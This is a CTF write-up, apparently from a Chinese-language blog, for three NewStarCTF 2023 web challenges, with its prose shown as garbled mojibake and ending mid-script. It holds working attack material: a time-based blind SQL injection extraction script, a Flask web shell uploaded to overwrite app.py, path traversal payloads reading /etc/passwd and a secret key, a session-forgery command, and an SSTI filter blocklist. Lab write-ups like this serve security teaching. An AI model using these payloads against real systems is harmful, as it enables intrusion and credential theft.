<h2 id="week4web-more-fast-midsql">WEEK4|WEB-More Fast-midsql</h2>
<p>è¿™é‡Œæ˜¯sqlæ³¨å…¥ï¼Œç®€å•æµ‹è¯•å‡ ç•ªï¼Œç»“æœå®è·µèƒ½åŠ›å·®çš„æˆ‘ï¼Œæ²¡æµ‹å‡ºæ¥è¿‡æ»¤äº†ä»€ä¹ˆå°±çœ‹wpäº†ï¼Œç»“æœåªæ˜¯è¿‡æ»¤äº†ä¸ªç©ºæ ¼ï¼Œçœ‹æ¥ä»¥åå¾—è®¤çœŸå­¦å­¦å¦‚ä½•æ‰‹åŠ¨fuzzå¤„å¤§æ¦‚è¿‡æ»¤çš„ä¸œè¥¿ã€‚è¿™é‡Œç¡®å®šæ˜¯ç©ºæ ¼ä¹‹åï¼Œå°è¯•æŠ¥é”™ï¼Œè”åˆç­‰ç­‰æ³¨å…¥å‡æ— æœï¼Œé¡µé¢è¿”å›ç»“æœä¸€è‡´ï¼Œäºæ˜¯å°è¯•æ—¶é—´ç›²æ³¨</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)
?id=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&gt;<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)</code></pre>
<p>ç»è¿‡ä¸Šè¿°payloadçš„æµ‹è¯•ï¼Œå‘ç°é¡µé¢æœ‰æ˜æ˜¾çš„æ—¶é—´å»¶è¿Ÿçš„ç°è±¡ï¼Œé‚£è‚¯å®šå°±æ˜¯æ—¶é—´ç›²æ³¨äº†ï¼Œè‚¯å®šå°±å¾—å†™è„šæœ¬äº†ï¼ˆåˆæ˜¯è„šæœ¬â”­â”®ï¹â”­â”®ï¼ŒçœŸå¿ƒä¸ä¼šå†™å•Šï¼‰ä¸‹å»å¾—è¿›ä¿®ä¸€ä¸‹pythonä»£ç äº†</p>
<p>è¿™é‡Œå…ˆæ„é€ ä¸€æ¡payloadï¼š</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ascii</span>(<span class="hljs-title function_ invoke__">substr</span>((select<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-keyword">from</span>(information_schema.schemata)),{i},<span class="hljs-number">1</span>))&gt;{mid},<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)</code></pre>
<p>éšåç¼–å†™è„šæœ¬</p>
<p>è¿™é‡Œçš„è„šæœ¬ä¹Ÿæ˜¯ä¸çŸ¥é“å’‹ä¼˜åŒ–ï¼Œä½†æ˜¯çœ‹å®˜æ–¹çš„åˆæ„Ÿè§‰æœ‰ç‚¹å¤æ‚ã€‚ã€‚ã€‚</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests
 
url = <span class="hljs-string">'http://f6337ab6-ed3c-472d-835f-3b756a55dd5d.node4.buuoj.cn:81/?id='</span>
 
database_name = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (left + right) // <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> left &lt; right:
        payload = url + <span class="hljs-string">f"1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),<span class="hljs-subst">{i}</span>,1))&gt;<span class="hljs-subst">{mid}</span>,sleep(2),0)#"</span>
        start_time = time.time()
        response = requests.get(payload).text
        end_time = time.time()
        use_time = end_time - start_time
 
        <span class="hljs-keyword">if</span> use_time &gt; <span class="hljs-number">2</span>:
            left = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid = (left + right) // <span class="hljs-number">2</span>
 
    <span class="hljs-built_in">print</span>(mid)
    database_name += <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(database_name)</code></pre>
<p>ä½†æ˜¯å‡ºæ¥çš„ç»“æœæ€»æ˜¯æœ‰åƒåœ¾å­—ç¬¦ï¼Œå¤´ç–¼ã€‚ã€‚ã€‚</p>
<p>â€‹</p>
<h2 id="week4web-flask-disk">WEEK4|WEB-flask disk</h2>
<p>è¿™é“é¢˜ç›®ä¹Ÿæ˜¯ä¹‹å‰oxgameåˆ·åˆ°è¿‡ï¼Œä¹Ÿæ˜¯å…³äºPINç ï¼Œæˆ‘ä»¥ä¸ºä¸é‚£ä¸ªç±»ä¼¼ç‚¹ï¼Œä½†è¿˜æ˜¯æœ‰æ‰€åŒºåˆ«ï¼Œä¸è¿‡è¿™åœ¨æš—ç¤ºæˆ‘å¾—å­¦ä¹ ä¸€æ³¢flaskçš„PINç äº†</p>
<p>![image-20231107201543598](NewStarCTF 2023/image-20231107201543598.png)</p>
<p>è¿™é‡Œé¢˜ç›®ç»™äº†ä¸‰ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªæ˜¯ä¼šæ˜¾ç¤ºä¸Šä¼ çš„æ–‡ä»¶æ—¶é—´ç­‰ä¿¡æ¯å•¥çš„ï¼Œ<a target="_blank" rel="noopener" href="http://xn--app-628dw05crlhba649l1sby07f9sef95f.py">ä¸è¿‡æœ€å¼€å§‹å¼€æ˜¾ç¤ºç€app.py</a>ï¼Œç„¶åuploadæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œä¸è¿‡æ²¡å•¥è¿‡æ»¤</p>
<p>![image-20231107201642236](NewStarCTF 2023/image-20231107201642236.png)</p>
<p>è€Œæœ€åä¸€ä¸ªæ˜¯ä¸€ä¸ªè®©å†™PINç çš„é¡µé¢ï¼Œè¿™é‡Œåªè¦å­¦è¿‡ç›¸å…³çŸ¥è¯†å¯ä»¥çŸ¥é“æ­¤æ—¶è‚¯å®šæ˜¯å¼€å¯äº†debugæ¨¡å¼çš„ï¼Œä¸è¿‡æˆ‘ä¹Ÿå°±åªèƒ½æƒ³åˆ°è¿™é‡Œï¼ˆåœ¨æ²¡å­¦ä¹‹å‰ï¼‰äºæ˜¯çœ‹äº†çœ‹wpï¼š</p>
<p>è®¿é—®admin manageå‘ç°è¦è¾“å…¥pinç ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ã€‚flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚æ³¨æ„è¯­æ³•ä¸èƒ½å‡ºé”™ï¼Œå¦åˆ™ä¼šå´©æºƒã€‚</p>
<p>ä¹Ÿæ˜¯å¾ˆæƒŠè®¶ï¼Œç«Ÿç„¶å¯ä»¥è¿™æ ·ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ªpyï¼Œåœ¨uploadä¸Šä¼ å³å¯</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
<span class="hljs-keyword">import</span> os

app = Flask(__name__)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">try</span>:
        cmd = request.args.get(<span class="hljs-string">'cmd'</span>)<span class="hljs-comment">#Python pass æ˜¯ç©ºè¯­å¥ï¼Œæ˜¯ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚pass ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥ã€‚</span>
        data = os.popen(cmd).read()
        <span class="hljs-keyword">return</span> data
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">return</span> <span class="hljs-string">"1"</span>

<span class="hljs-keyword">if</span> __name__ = <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)</code></pre>
<p>æ¯”å¦‚ä¸Šè¿°pyå°±æ³¨æ„éœ€è¦å¯¼å…¥å¿…è¦çš„flaskï¼Œapp.runç­‰ç­‰</p>
<p>![image-20231107203516994](NewStarCTF 2023/image-20231107203516994.png)</p>
<p>è¿™é‡Œä¹Ÿæ˜¯è¸©äº†ä¸ªå°å‘ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸€å®šè¦æ˜¯app.pyä¸ç„¶è¦†ç›–ä¸äº†ã€‚ã€‚ã€‚ã€‚ã€‚ä¸‹é¢é™„ä¸€ä¸ªé¢˜ç›®æºç ï¼š</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,send_file
<span class="hljs-keyword">import</span> os,datetime
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>,methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;h1&gt;Welcome to my flask disk&lt;/h1&gt;&lt;a href="/list"&gt;list files&lt;/a&gt;&lt;br&gt;&lt;a href="/upload"&gt;upload files&lt;/a&gt;&lt;br&gt;&lt;a href="/console"&gt;admin manage&lt;/a&gt;'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/list'</span>,methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>():
    dirs = os.listdir(<span class="hljs-string">'.'</span>)<span class="hljs-comment">#è¿”å›æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ã€‚è¿™é‡Œåº”è¯¥å°±æ˜¯å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span>
    items = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:
        <span class="hljs-keyword">if</span> os.path.isfile(<span class="hljs-built_in">dir</span>):<span class="hljs-comment">#åˆ¤æ–­è·¯å¾„æ˜¯å¦ä¸ºæ–‡ä»¶</span>
            create_time = <span class="hljs-built_in">int</span>(os.path.getctime(<span class="hljs-built_in">dir</span>))<span class="hljs-comment">#è¿”å›æ–‡ä»¶ path åˆ›å»ºæ—¶é—´</span>
            create_time = datetime.datetime.fromtimestamp(create_time)<span class="hljs-comment">#è¿™é‡Œæ˜¯å¯¹create_timeè¿™ä¸ªæ—¶é—´æˆ³è½¬æ¢ä¸ºæ­£å¸¸æ—¥æœŸ</span>
            <span class="hljs-comment">#ä¸‹é¢æ˜¯è¿”å›æ–‡ä»¶å¤§å°ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±è¿”å›é”™è¯¯</span>
            item =<span class="hljs-string">f'&lt;/pre&gt;<span class="hljs-subst">{<span class="hljs-built_in">dir</span>}</span>  <span class="hljs-subst">{<span class="hljs-built_in">str</span>(os.path.getsize(<span class="hljs-built_in">dir</span>))}</span>b  <span class="hljs-subst">{create_time}</span>&lt;/pre&gt;&lt;br&gt;&lt;br&gt;'</span>
            items += item
            items += <span class="hljs-string">'\n'</span>
    <span class="hljs-keyword">return</span> items

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/upload'</span>,methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'GET'</span>:
        s=<span class="hljs-string">'&lt;form action="/upload" method="POST" enctype="multipart/form-data"&gt;&lt;input type="file" name="file"&gt;&lt;input type="submit" value="Upload"&gt;&lt;/form&gt;'</span>
        <span class="hljs-keyword">return</span> s
    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">'POST'</span>:
        file = request.files[<span class="hljs-string">'file'</span>]<span class="hljs-comment">#postä¸Šä¼ æ–‡ä»¶file</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">'..'</span> <span class="hljs-keyword">in</span> file.filename <span class="hljs-keyword">or</span> <span class="hljs-string">'/'</span> <span class="hljs-keyword">in</span> file.filename:<span class="hljs-comment">#é˜²æ­¢ç›®å½•ç©¿è¶Š</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">'.. and / are not allowed!'</span>
        
        file.save(file.filename)<span class="hljs-comment">#ä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">'upload success. &lt;a href="/list"&gt;check&lt;/a&gt;'</span>
    
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/download'</span>,methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():
    filename = request.args.get(<span class="hljs-string">'filename'</span>)<span class="hljs-comment">#æ¥å—filenameçš„getä¼ å‚</span>
    <span class="hljs-keyword">if</span> filename <span class="hljs-keyword">and</span> os.path.exists(filename):<span class="hljs-comment">#åˆ¤æ–­filenameå‚æ•°æ˜¯å¦å­˜åœ¨ï¼Œä¸”å¯¹åº”çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">'..'</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">or</span> <span class="hljs-string">'/'</span> <span class="hljs-keyword">in</span> filename:<span class="hljs-comment">#é˜²æ­¢ç›®å½•ç©¿è¶Š</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">'.. and / are not allowed!'</span>
        <span class="hljs-keyword">return</span> send_file(filename,as_attachment=<span class="hljs-literal">True</span>)<span class="hljs-comment">#as_attachmentç¡®ä¿filenameå¯¹åº”çš„æ–‡ä»¶å¯ä»¥æ­£å¸¸çš„è¢«ä¸‹è½½åˆ°</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'no file to download or file not exist'</span>

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,debug=<span class="hljs-literal">True</span>,port=<span class="hljs-number">5000</span>)</code></pre>
<p>è‡³äºPINç çš„å­¦ä¹ ï¼Œä¹‹åå¦å¼€ä¸€ç¯‡æ–‡ç« </p>
<h2 id="week4web-injectme">WEEK4|WEB-InjectMe</h2>
<p>![image-20231107213238881](NewStarCTF 2023/image-20231107213238881.png)</p>
<p>é¦–é¡µæç¤ºæˆ‘ä»¬å›¾ç‰‡ä¼¼ä¹æœ‰ç§˜å¯†ï¼Œè¿™é‡Œç›´æ¥ç‚¹å‡»è¿›å»çœ‹åˆ°äº†æœ‰å¾ˆå¤šæ–‡ä»¶æˆ–è€…å›¾åƒå¯ä»¥è¯»å–ï¼Œçœ‹äº†ä¸€é€šå‘ç°</p>
<p>![image-20231107213326629](NewStarCTF 2023/image-20231107213326629.png)</p>
<p>é™¤äº†ä¸Šå›¾çš„dsæ–‡ä»¶ï¼Œå°±åªæœ‰ä¸‹é¢è¿™ä¸ªæœ‰äº›è®¸æºç çš„å›¾äº†ï¼Œè¿™é‡Œåªæ”¾äº†downloadè·¯ç”±çš„å®ç°æ–¹æ³•</p>
<p>![image-20231107212741290](NewStarCTF 2023/image-20231107212741290.png)</p>
<p>è¿™é‡Œåˆ†æå‘ç°ï¼Œä¼šæ¥å—ä¸€ä¸ªfileçš„getä¼ å‚ï¼Œä¹‹åå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œâ€¦/çš„è¿‡æ»¤ï¼Œä½†è¿™é‡Œåªæ›¿æ¢äº†ä¸€æ¬¡ã€‚æ˜æ˜¾å¯ä»¥åŒå†™ç»•è¿‡ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è¯»å–å¦‚ä¸‹æ–‡ä»¶</p>
<pre><code class="hljs http">?file=....//....//....//....//....//etc/passwd
?file=....//....//....//....//....//app/app.py</code></pre>
<pre><code class="hljs plaintext">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</code></pre>
<p>è¿™é‡Œç¬¬äºŒä¸ªè·¯å¾„é çš„æ˜¯é¢˜ç›®ç»™çš„é™„ä»¶æ‰å‡ºæ¥çš„</p>
<p>![image-20231107213918683](NewStarCTF 2023/image-20231107213918683.png)</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re

<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string
<span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key

app = Flask(__name__)
app.secret_key = secret_key<span class="hljs-comment">#æœ‰sessionä¼ªé€ çš„æ„Ÿè§‰äº†</span>


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application's code here</span>
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/cancanneed"</span>, methods=[<span class="hljs-string">"GET"</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():
    <span class="hljs-comment">#os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨</span>
    all_filename = os.listdir(<span class="hljs-string">'./static/img/'</span>)
    filename = request.args.get(<span class="hljs-string">'file'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">if</span> filename:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'img.html'</span>, filename=filename, all_filename=all_filename)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">'./static/img/'</span>))}</span> &lt;br&gt; &lt;a href=\"/cancanneed?file=1.jpg\"&gt;/cancanneed?file=1.jpg&lt;/a&gt;"</span>


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/download"</span>, methods=[<span class="hljs-string">"GET"</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():
    filename = request.args.get(<span class="hljs-string">'file'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">if</span> filename:
        filename = filename.replace(<span class="hljs-string">'../'</span>, <span class="hljs-string">''</span>)
        filename = os.path.join(<span class="hljs-string">'static/img/'</span>, filename)
        <span class="hljs-built_in">print</span>(filename)
        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">"start"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):
            <span class="hljs-keyword">return</span> send_file(filename)
        <span class="hljs-keyword">else</span>:
            abort(<span class="hljs-number">500</span>)
    <span class="hljs-keyword">else</span>:
        abort(<span class="hljs-number">404</span>)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/backdoor'</span>, methods=[<span class="hljs-string">"GET"</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">"user"</span>))
        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">"user"</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            session[<span class="hljs-string">'user'</span>] = <span class="hljs-string">"guest"</span>
        name = session.get(<span class="hljs-string">"user"</span>)
        <span class="hljs-keyword">if</span> re.findall(
                <span class="hljs-string">r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span>,
                name):
            abort(<span class="hljs-number">500</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> render_template_string(
                <span class="hljs-string">'ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜'</span> % name)
    <span class="hljs-keyword">except</span> Exception:
        abort(<span class="hljs-number">500</span>)


<span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_find</span>(<span class="hljs-params">e</span>):
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'404.html'</span>), <span class="hljs-number">404</span>


<span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">500</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">internal_server_error</span>(<span class="hljs-params">e</span>):
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'500.html'</span>), <span class="hljs-number">500</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8080</span>)</code></pre>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/backdoor'</span>, methods=[<span class="hljs-string">"GET"</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">"user"</span>))
        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">"user"</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            session[<span class="hljs-string">'user'</span>] = <span class="hljs-string">"guest"</span>
        name = session.get(<span class="hljs-string">"user"</span>)
        <span class="hljs-keyword">if</span> re.findall(
                <span class="hljs-string">r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span>,
                name):
            abort(<span class="hljs-number">500</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> render_template_string(
                <span class="hljs-string">'ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜'</span> % name)</code></pre>
<p>é‡ç‚¹å°±æ˜¯backdooræ–¹æ³•äº†ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯sstiæ³¨å…¥äº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦ä¼ªé€ session.useræ‰å¯ã€‚è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpæ‰çŸ¥é“è¯»å–keyçš„è·¯å¾„ï¼š<code>?file=....//....//....//....//....//app/config.py</code>â€“è¿™é‡Œä¹Ÿæ˜¯æœäº†ï¼Œå®˜æ–¹ç»™çš„è·¯å¾„æ˜¯é”™çš„ï¼Œå¹¸äºæˆ‘çŒœå‡ºæ¥äº†ã€‚ã€‚ã€‚</p>
<pre><code class="hljs plaintext">secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"</code></pre>
<p>æˆ‘ä»¬ç›´æ¥ç”¨å·¥å…·åŠ å¯†è§£å¯†å³å¯ï¼š</p>
<pre><code class="hljs py">sessionä¸ºï¼šeyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY
keyä¸ºï¼šy0u_n3ver_k0nw_s3cret_key_1s_newst4r

python3 flask_session_cookie_manager3.py decode -s <span class="hljs-string">"y0u_n3ver_k0nw_s3cret_key_1s_newst4r"</span> -c <span class="hljs-string">"eyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY"</span></code></pre>
<p>è¿™é‡Œä¹Ÿæ˜¯é‡åˆ°ä¸ªå‘ï¼Œä¸çŸ¥ä¸ºä½•ï¼Œ-s å’Œ -céƒ½å¿…é¡»åŒå¼•å·åŒ…å›´ï¼Œå•å¼•å·åŒ…å›´ä¸€ç›´æŠ¥é”™ï¼Œä¸æ¸…æ¥šä¸ºä½•ã€‚ã€‚ã€‚</p>
<p>![image-20231107220643922](NewStarCTF 2023/image-20231107220643922.png)</p>
<p>å¦‚å›¾æˆåŠŸçœ‹åˆ°è§£å¯†ç»“æœï¼Œæ¥ä¸‹æ¥å°±æ˜¯åŠ å¯†äº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰åº”è¯¥æƒ³å¥½å¦‚ä½•pass sstiï¼Œçœ‹ä¸Šè¿°ä»£ç å‘ç°å…³é”®è¯è¿‡æ»¤äº†å¾ˆå¤šï¼Œå¹¶ä¸”ç¼–ç å‘¢ä¹Ÿè¿‡æ»¤äº†base64ï¼Œunicodeã€‚åå…­è¿›åˆ¶ã€‚é‚£æˆ‘ä»¬å…«è¿›åˆ¶ç»•è¿‡å³å¯ï¼Œæ€è·¯æ¸…æ™°äº†ï¼Œä½†æ˜¯æ‰‹å·¥çš„è¯å¤ªè´¹åŠ²ï¼Œä¸€çœ‹å®˜æ–¹wpï¼Œåˆæ˜¯è„šæœ¬â”­â”®ï¹â”­â”®ã€‚å”‰ï¼Œè¿˜æ˜¯å¾—è‰°éš¾çš„å•ƒä¸€å•ƒï¼š</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> re <span class="hljs-comment">#æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> subprocess <span class="hljs-comment">#ç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</span>


<span class="hljs-comment"># æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py</span>
<span class="hljs-comment"># https://github.com/noraj/flask-session-cookie-manager</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_octal_ascii</span>(<span class="hljs-params">s</span>):
    octal_ascii = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> s:
        char_code = <span class="hljs-built_in">ord</span>(char) <span class="hljs-comment">#è½¬æ¢ä¸ºASCIIç </span>
        <span class="hljs-comment">#03o å‚æ•°å‘Šè¯‰ format å‡½æ•°å°† char_code è½¬æ¢ä¸ºå…«è¿›åˆ¶ï¼Œç„¶åç¡®ä¿è‡³å°‘å 3ä½å®½ï¼Œä¸è¶³çš„åœ°æ–¹ç”¨é›¶å¡«å……ã€‚</span>
